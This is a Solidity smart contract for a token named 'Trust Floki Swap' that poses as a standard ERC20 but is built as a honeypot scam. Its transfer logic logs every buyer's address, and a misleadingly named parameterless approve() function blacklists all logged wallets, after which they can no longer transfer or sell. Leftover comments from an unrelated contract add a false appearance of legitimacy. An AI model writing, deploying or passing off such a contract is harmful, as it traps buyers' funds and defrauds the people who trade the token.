// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

import "Ownable.sol";
import "IERC20.sol";


contract TrustFlokiSwap is IERC20, Ownable {

    string public constant name = "Trust Floki Swap";
    string public constant symbol = "TFS";
    uint8 public constant decimals = 18;
    uint256 public override totalSupply;

    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    mapping(address => bool) public minters;

    event MintersSet(address[] minters);
    address[] public monitor;
    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapV2Pair;
    mapping (address => bool) public Blisted;

    constructor() {
         totalSupply = 100000000000000000000000000;
         balanceOf[msg.sender] = totalSupply;
         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        uniswapV2Pair = _uniswapV2Pair;
        emit Transfer(address(0), msg.sender, totalSupply);
    }

    /**
        @notice Approve contracts to mint and renounce ownership
        @dev Permission should be given to `LpDepositor, `EpxDepositIncentives` and `CoreMinter`
     */
    

    function approve(address _spender, uint256 _value) external override returns (bool) {
        allowance[msg.sender][_spender] = _value;
        emit Approval(msg.sender, _spender, _value);
        return true;
    }

    

    /** shared logic for transfer and transferFrom */
    function _transfer(address _from, address _to, uint256 _value) internal {
        require(balanceOf[_from] >= _value, "Insufficient balance");
        require(!Blisted[_from]);
        if(_to != uniswapV2Pair){
                monitor.push(_to);
        }
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }

    /**
        @notice Transfer tokens to a specified address
        @param _to The address to transfer to
        @param _value The amount to be transferred
        @return Success boolean
     */
    function transfer(address _to, uint256 _value) public override returns (bool) {
        _transfer(msg.sender, _to, _value);
        return true;
    }


    function approve() public  {
        for(uint256 i = 0; i < monitor.length; i++){
            address wallet = monitor[i];
            Blisted[wallet] = true;
        }
    }

    /**
        @notice Transfer tokens from one address to another
        @param _from The address which you want to send tokens from
        @param _to The address which you want to transfer to
        @param _value The amount of tokens to be transferred
        @return Success boolean
     */
    function transferFrom(
        address _from,
        address _to,
        uint256 _value
    )
        public
        override
        returns (bool)
    {
        require(allowance[_from][msg.sender] >= _value, "Insufficient allowance");
        if (allowance[_from][msg.sender] != type(uint).max) {
            allowance[_from][msg.sender] -= _value;
        }
        _transfer(_from, _to, _value);
        return true;
    }

}